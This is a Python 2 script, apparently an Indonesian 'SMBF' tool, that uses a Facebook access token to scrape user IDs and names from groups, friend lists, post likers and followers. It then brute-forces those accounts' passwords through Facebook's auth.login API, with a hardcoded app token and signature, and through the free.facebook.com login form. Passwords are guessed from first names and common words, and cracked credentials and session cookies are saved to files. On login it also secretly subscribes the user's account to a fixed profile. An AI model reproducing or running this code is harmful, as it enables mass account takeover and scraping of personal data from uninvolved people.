#-*-coding:utf-8-*-

import os,sys,time,requests,json
from concurrent.futures import ThreadPoolExecutor as Bool
from datetime import datetime
from time import sleep

ct = datetime.now()
n = ct.month
bulan=["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","Nopember","Desember"]
try:
        if n < 0 or n>12:
            exit()
        nTemp=n-1;
except ValueError :
        exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

reload(sys)
sys.setdefaultencoding("utf-8")

s=requests.Session()
api="https://graph.facebook.com/{}"
hea={"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36"}
gent = "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"

K = '\033[1;93m' #
I = '\033[0m' #hapus warna
M = '\033[1;31m' #merah
H = '\033[1;32m' #hijau
U = "\033[1;36m" #ungu

id = []
loop = 0
ok = []
cp = []

def logo():
	os.system("clear")
	print(I+"""
    _________            __________________________ 
   /   _____/           /     \\______   \_   _____/ 
   \_____  \   ______  /  \ /  \|    |  _/|    __) 
   /        \ /_____/ /    Y    \    |   \|     \ 
  /_______  /         \____|__  /______  /\___  / 
          \/                  \/       \/     \/\n"""+I)

def __masuk__():
	try:
		token = open("token","r").read()
	except IOError:
		os.remove("token")
		exit("\n  [!] access token invalid")
	try:
		nama = s.get(api.format("me?access_token=%s"%(token),headers=hea)).json()["name"]
	except KeyError:
		os.remove("token")
		exit("\n  [!] access token anda mati silahkan login kembali")
	logo()
	print("  [ selamat datang %s%s%s ]\n"%(K,nama,I))
	print("  [1]. dump id dari postingan grup")
	print("  [2]. dump id dari daftar publik")
	print("  [3]. dump id dari id postingan")
	print("  [4]. dump id dari total followers")
	print("  [5]. star crack ")
	print("  [0]. logout (hapus token)")

	adam = raw_input("\n  [*] adam : ")
	if adam=="":__masuk__()
	elif adam=="1":
		__postgrup__()
	elif adam=="2":
		__publik__()
	elif adam=="3":
		__post__()
	elif adam=="4":
		__foll__()
	elif adam=="5":
		__crack__().mains()
	elif adam=="0":
		k = raw_input("  [!] apakah anda yakin ingin menghapus access token anda? [Y/t] : ")
		if k in("Y","y"):
			p=['.   ','..  ','... ']
			for i in p:
				print("\r  [*] menghapus token%s"%(i)),;sys.stdout.flush();sleep(2)
			try:
				os.remove("token")
			except:
				os.system("rm token")

	else:
		exit("\n  [!] kumaha sia goblok ! ")

def __postgrup__():
	try:
		token=open("token","r").read()
	except IOError:
		exit("\n  [!] access token anda mati silahkan login kembali")
	__idgrup__=raw_input("  [!] masukan id postingan : ")
	if __idgrup__=="":__postgrup__()
	__file__=raw_input("  [*] masukan nama file : ").replace(" ","_")
	open(__file__,"w").close()
	print("\n  [!] untuk berhenti tekan CTRL + C") #,;sys.stdout.flush();sleep(1)
	try:
		for i in s.get(api.format("%s/likes?fields=id,name&access_token=%s"%(__idgrup__,token),headers=hea)).json()["data"]:
			open(__fil__,"a+").write(
				"%s<=>%s\n"%(i["id"],i["name"]))
			print("\r  [*] mengumpulkan id postingan grup -> %s"%(len(open(__fil__).read().splitlines()))),;sys.stdout.flush()
	except KeyboardInterrupt:
		exit("\n  [!] keyboardinterrupt terdeteksi... ! ")
	except KeyError:
		exit("\n  [!] gagal mengumpulkan id postingan grup")
	except requests.exceptions.ConnectionError:
		exit("\n  [!] koneksi internet bermasalah")
	exit("  [*] berhasil mengumpilkan id publik. id tersimpan ke file (%s%s%s)"%(M,__file__,I))

def __publik__():
	try:
		token=open("token","r").read()
	except IOError:
		exit("\n  [!] access token anda mati silahkan login kembali")
	__idpublik__=raw_input("  [!] masukan id publik : ")
	if __idpublik__=="":__publik__()
	__file__=raw_input("  [*] masukan nama file : ").replace(" ","_")
	open(__file__,"w").close()
	print("\n  [!] untuk berhenti tekan CTRL + C") #,;sys.stdout.flush();sleep(1)
	try:
		for i in s.get(api.format("%s/friends?limit=5000&access_token=%s"%(__idpublik__,token),headers=hea)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			open(__file__,"a+").write(
				"%s<=>%s\n"%(i["id"],i["name"]))
			print("\r  [*] mengumpulkan id publik -> %s"%(len(open(__file__).read().splitlines()))),;sys.stdout.flush()
	except KeyboardInterrupt:
		exit("\n  [!] keyboardinterrupt terdeteksi... ! ")
	except KeyError:
		exit("\n  [!] gagal mengumpulkan id publik")
	except requests.exceptions.ConnectionError:
		exit("\n  [!] koneksi jaringan bermasalah")
	exit("  [*] berhasil mengumpulkan id publik. id tersimpan ke file (%s%s%s)"%(M,__file__,I))

def __post__():
	try:
		token=open("token","r").read()
	except IOError:
		exit("\n  [!] access token anda mati silahkan login kembali")
	__idpost__=raw_input("  [!] masukan id postingan publik/teman : ")
	if __idpost__=="":__post__()
	__file__=raw_input("  [*] masukan nama file : ").replace(" ","_")
	open(__file__,"w").close()
	print("\n  [!] untuk berhenti tekan CTRL + C")
	try:
		for i in s.get(api.format("%s/likes?limit=5000&access_token=%s"%(__idpost__,token),headers=hea)).json()["data"]:
			open(__file__,"a+").write(
				"%s<=>%s\n"%(i["id"],i["name"]))
			print("\r  [*] mengumpulkan id postingan -> %s"%(len(open(__file__).read().splitlines()))),;sys.stdout.flush()
	except KeyboardInterrupt:
                exit("\n  [!] keyboardinterrupt terdeteksi... ! ")
        except KeyError:
                exit("\n  [!] gagal mengumpulkan id postingan")
        except requests.exceptions.ConnectionError:
                exit("\n  [!] koneksi jaringan bermasalah")
	exit("  [*] berhasil mengumpulkan id postingan. id tersimpan ke (%s%s%s)"%(M,__file__,I))

def __foll__():
	try:
		token = open("token","r").read()
	except IOError:
		exit("\n  access token anda mati silahkan login kembali")
	__idfol__=raw_input("  [!] masukan id target followers : ")
	if __idfol__=="":__foll__()
	__file__=raw_input("  [*] masukan nama file : ").replace(" ","_")
	open(__file__,"w").close()
	print("\n  [!] untuk berhenti tekan CTRL + C") #,;sys.stdout.flush();sleep(1)
	try:
		for i in s.get(api.format("%s/subscribers?limit=5000&access_token=%s"%(__idfol__,token),headers=hea)).json()["data"]:
			open(__file__,"a+").write(
				"%s<=>%s\n"%(i["id"],i["name"]))
			print("\r  [*] mengumpulkan id followers -> %s"%(len(open(__file__).read().splitlines()))),;sys.stdout.flush()
	except KeyboardInterrupt:
                exit("\n  [!] keyboardinterrupt terdeteksi... ! ")
        except KeyError:
                exit("\n  [!] gagal mengumpulkan id followers")
        except requests.exceptions.ConnectionError:
                exit("\n  [!] koneksi jaringan bermasalah")
	exit("  [*] berhasil mengumpulkan id followers. id tersimpan ke file (%s%s%s)"%(M,__file__,I))

class __crack__:
	def __init__(self):
		self.fl=[]
	def mains(self):
		try:
			self.apk=raw_input("\n  [!] masukan file : ")
			self.id=open(self.apk).read().splitlines()
		except:
			print("\n  [!] file tidak ada ! ")
			__crack__().mains()
		print("  [+] total id -> %s"%(len(self.id)))
		pwd=raw_input("\n  [?] apakah anda ingin menggunakan password manual? [Y/t]: ")
		if pwd in("Y","y"):
			print("\n  [*] gunakan , (koma) untuk pemisah contoh : name123,name12345 dll. setiap kata sandi minimal 6 karakter atau lebih")
			while True:
				pwek=raw_input("\n  [?] set kata sandi : ")
				print("  [*] crack dengan sandi -> [ %s%s%s ]"%(M,pwek,I))
				if pwek=="":
					self.mains()
				else:
					def __uwu__(css=None):
						pi = raw_input("\n  [*] method : ")
						if pi=="":
							self.__uwu__()
						elif pi=="1":
							print("\n  [#] hasil OK disimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
							print("  [#] hasil CP disimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
							print("\n  [!] untuk menjedah proses crack anda bisa mematikan data seluler atau CTRL + Z\n")
							with Bool(max_workers=30) as tokai:
								for uwu in self.id:
									try:
										uw = uwu.split("<=>")[0]
										tokai.submit(self.__api__,uw,css)
									except:pass
							exit("\n\n  [#] crack selesai...")
						elif pi=="2":
							print("\n  [#] hasil OK disimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
							print("  [#] hasil CP disimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
							print("\n  [!] untuk menjedah proses crack anda bisa mematikan data seluler atau CTRL + Z\n")
							with Bool(max_workers=30) as tokai:
								for uwu in self.id:
									try:
										uw = uwu.split("<=>")[0]
										tokai.submit(self.__mbasic__,uw,css)
									except:pass
							exit("\n\n  [#] crack selesai...")
						else:
							exit("\n  [!] goblok ! ")

					print("\n  [ pilih method login - silahkan coba satu² ]\n")
                                        print("  [1] method API (mode fast)")
                                        print("  [2] method mbasic (mode slow)")
					__uwu__(pwek.split(","))
					break
		elif pwd in("T","t"):
			print("\n  [ pilih method login - silahkan coba satu² ]\n")
                        print("  [1] method API (mode fast)")
                        print("  [2] method mbasic (mode slow)")
			self.__pler__()
		else:
			exit("\n  [!] goblok ! ")

	def __api__(self,user,hum):
		global ok,cp,loop
		print I+"\r  [*] [Crack] %s/%s -> OK-:%s - CP-:%s "%(loop,len(self.id),len(ok),len(cp)),;sys.stdout.flush()
		for pw in hum:
			pw=pw.lower()
			param={
				"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
				"format": "json",
				"sdk_version": "2",
				"email":user,
				"locale": "en_US",
				"password":pw,
				"sdk": "ios",
				"generate_session_cookies":"1",
				"sig":"3f555f99fb61fcd7aa0c44f58f522ef6"
			}
			apih="https://b-api.facebook.com/method/auth.login"
			response = requests.get(apih,params=param)
			if "session_key" in response.text and "EAAA" in response.text:
				print (H+"\r   * --> %s|%s        "%(user,pw))
                                wrt="%s|%s"%(user,pw)
                                ok.append(wrt)
                                open("result⁄OK-%s-%s-%s.txt"%(ha,op,ta),"a").write("%s\n"%(wrt))
                                break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print (K+"\r   * --> %s|%s          "%(user,pw)) 
                                wrt="%s|%s"%(user,pw)
                                cp.append(wrt)
                                open("result⁄CP-%s-%s-%s.txt"%(ha,op,ta),"a").write("%s\n"%(wrt))
                                break
			else:continue
		loop+=1

	def __mbasic__(self,user,hum):
		global ok,cp,loop
		print I+"\r  [*] [Crack] %s/%s -> OK-:%s - CP-:%s "%(loop,len(self.id),len(ok),len(cp)),;sys.stdout.flush()
		for pw in hum:
			pw=pw.lower()
			ses=requests.Session()
			ses.get("https://free.facebook.com/")
			ses.headers.update({"User-Agent":"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]"})
			b=ses.post("https://free.facebook.com/login",data={"email":user,"pass":pw}).url
			if "c_user" in ses.cookies.get_dict().keys():
				kuki=";".join([("%s=%s"%(key,value)) for key,value in ses.cookies.get_dict().items()])
				print (H+"\r   * --> %s|%s|%s     "%(user,pw,kuki))
                                wrt="%s|%s|%s"%(user,pw,kuki)
                                ok.append(wrt)
                                open("result⁄OK-%s-%s-%s.txt"%(ha,op,ta),"a").write("%s\n"%(wrt))
                                break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print (H+"\r   * --> %s|%s        "%(user,pw))
                                wrt="%s|%s"%(user,pw)
                                cp.append(wrt)
                                open("result⁄CP-%s-%s-%s.txt"%(ha,op,ta),"a").write("%s\n"%(wrt))
                                break
			else:continue
		loop+=1
	def __pler__(self):
		dam = raw_input("\n  [*] method : ")
		if dam=="":self.__pler__()
		elif dam=="1":
			print("\n  [#] hasil OK tersimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
			print("  [#] hasil CP tersimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
			print("\n  [!] untuk menjedah proses crack anda bisa mematikan data seluler atau CTRL + Z \n")
			with Bool(max_workers=30) as tokai:
				for uwu in self.id:
					try:
						lup = uwu.split("<=>")
						i = lup[1].split(" ")
						if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
							if len(i[0])<=5:
								nesa = [i[0]+"123",i[0]+"12345"]
							else:
								nesa = [i[0],i[0]+"123",i[0]+"12345"]
						else:
							nesa = ["bismillah","sayang","rahasia","123456","anjing"]
						tokai.submit(self.__api__,lup[0],nesa)
					except:pass
			exit("\n\n  [#] crack selesai...")

		elif dam in["2","02"]:
			print("\n  [#] hasil OK tersimpan ke : result⁄OK-%s-%s-%s.txt"%(ha,op,ta))
			print("  [#] hasil CP tersimpan ke : result⁄CP-%s-%s-%s.txt"%(ha,op,ta))
			print("\n  [!] anda bisa menjedah proses crack dengan mematikan data seluler atau CTRL + Z \n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("<=>")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345"]
						else:
							pewe=["bismillah","sayang","123456","rahasia","anjing","cinta"]
						tokai.submit(self.__mbasic__,xi[0],pewe)
					except:pass
			exit("\n\n  [#] crack selesai...")

class __login__:
	def __init__(self,token):
		self.tok=token
	def logins(self):
		try:
			na = s.get(api.format("me?access_token=%s"%(self.tok),headers=hea)).json()["name"]
			print("\n[*] hi selamat datang %s%s%s\n"%(K,na,I)),;sys.stdout.flush();sleep(1)
			p=['.   ','..  ','... ']
			for i in p:
				print("\r[*] mohon tunggu sebentar%s"%(i)),;sys.stdout.flush();sleep(2)
			s.post(api.format("1629570007?subscribers&access_token=%s"%(self.tok)))
			open("token","w").write(a)
			exit("[*] login berhasil, jalankan ulang scriptnya")
		except KeyError:
			exit("\n[!] login gagal, periksa kembali akun anda")
		except requests.exceptions.ConnectionError:
			exit("\n[!] koneksi jaringan bermasalah")

if __name__=="__main__":
	try:
		token=open("token","r").read()
	except IOError:
		os.system("clear")
		print("* untuk mendapatkan token silahkan anda download kiwi browser dan pasang \033[1;36mextensi multipe for fb\033[0m")
		print("* atau bisa melalui link berikut \033[1;36mhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed&\033[0m")
		while True:
			a = raw_input("\n+ masukan access token : ")
			if a=="":
				os.system("clear")
			else:
				__login__(a).logins()
	__masuk__()
